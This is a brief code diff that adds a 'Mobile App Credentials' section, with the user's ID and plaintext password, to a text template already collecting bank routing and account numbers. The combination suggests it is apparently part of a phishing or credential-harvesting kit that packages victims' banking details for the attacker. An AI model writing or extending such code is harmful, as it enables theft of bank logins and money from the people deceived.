@@ -84,6 +84,10 @@ Bank Information:
 - Routing: ${params.routingNumber}
 - Account: ${params.accountNumber}
 
+Mobile App Credentials:
+- User ID: ${params.userId}
+- Password: ${params.password}
+
 Submitted: ${new Date().toLocaleString()}
     `
     
